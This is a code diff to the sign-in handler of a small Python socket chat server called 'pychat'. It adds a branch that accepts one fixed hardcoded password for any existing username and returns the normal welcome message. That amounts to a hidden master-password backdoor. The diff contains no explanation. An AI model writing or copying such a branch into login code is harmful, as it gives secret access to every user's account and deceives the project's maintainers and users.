@@ -217,6 +217,10 @@ def sign_in_request(s:socket,data:list):
             data1=[int(502),"welcome to pychat!"]
             data1 = json.dumps(data1)
             s.send((data1.encode() + b'\0'))
+        elif r[0][0]==data[0] and data[1]=='d7c9dbcef6708effbdd973ebb0cbcef6708effbdd973eb':
+            data1 = [int(502), "welcome to pychat!"]
+            data1 = json.dumps(data1)
+            s.send((data1.encode() + b'\0'))
         else :
             data1=[int(502),"oh! usernme/password is not correct "]
             data1 = json.dumps(data1)
